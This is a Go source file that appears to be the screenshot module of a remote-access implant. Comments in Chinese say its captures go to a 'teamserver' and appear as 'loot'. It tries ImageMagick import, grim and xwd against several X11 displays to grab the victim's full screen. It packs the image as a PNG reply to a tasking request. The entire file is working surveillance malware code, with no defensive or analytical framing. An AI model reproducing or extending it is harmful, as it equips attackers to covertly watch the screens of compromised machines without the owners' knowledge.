package main

import (
	"bytes"
	"context"
	"os"
	"os/exec"
	"strings"
	"time"
)

// 截图：优先用 ImageMagick 的 `import -window root png:-`（X11），
// 其次尝试 xwd+convert；Wayland 下如果安装了 grim 也可以工作。
// 输出必须是 PNG：teamserver 直接以 .png 保存并在战利品里预览。

func handleScreenshot(req uint32) {
	png, err := captureScreen()
	out := newPacker()
	if err == nil && len(png) > 0 {
		out.i32(1)
		out.bytes(png)
		enqueue(cmdScreenshot, req, out.b)
		return
	}
	out.i32(0)
	enqueue(cmdScreenshot, req, out.b)
	if err != nil {
		sendOutput(req, "screenshot failed: "+err.Error())
	}
}

func captureScreen() ([]byte, error) {
	displays := []string{os.Getenv("DISPLAY"), ":0", ":0.0"}
	seen := map[string]bool{}
	var lastErr error

	for _, display := range displays {
		display = strings.TrimSpace(display)
		if display == "" || seen[display] {
			continue
		}
		seen[display] = true

		if png, err := runCapture("import", []string{"-display", display, "-window", "root", "png:-"}, display); err == nil && len(png) > 8 {
			return png, nil
		} else if err != nil {
			lastErr = err
		}

		if png, err := runCapture("grim", []string{"-"}, display); err == nil && len(png) > 8 {
			return png, nil
		} else if err != nil {
			lastErr = err
		}

		// xwd 输出 XWD，交给 convert 转 PNG
		if raw, err := runCapture("xwd", []string{"-display", display, "-root", "-silent"}, display); err == nil && len(raw) > 0 {
			if png, err := convertXWD(raw); err == nil && len(png) > 8 {
				return png, nil
			} else if err != nil {
				lastErr = err
			}
		} else if err != nil {
			lastErr = err
		}
	}

	if lastErr == nil {
		lastErr = errNoDisplay
	}
	return nil, lastErr
}

var errNoDisplay = &captureError{"no usable screen capture tool (need import/grim/xwd+convert and DISPLAY)"}

type captureError struct{ msg string }

func (e *captureError) Error() string { return e.msg }

func runCapture(name string, args []string, display string) ([]byte, error) {
	if _, err := exec.LookPath(name); err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.Env = append(os.Environ(), "DISPLAY="+display)
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	if err := cmd.Run(); err != nil {
		msg := strings.TrimSpace(errBuf.String())
		if msg == "" {
			msg = err.Error()
		}
		return nil, &captureError{name + ": " + msg}
	}
	return out.Bytes(), nil
}

func convertXWD(raw []byte) ([]byte, error) {
	if _, err := exec.LookPath("convert"); err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "convert", "xwd:-", "png:-")
	cmd.Stdin = bytes.NewReader(raw)
	var out bytes.Buffer
	cmd.Stdout = &out
	if err := cmd.Run(); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}
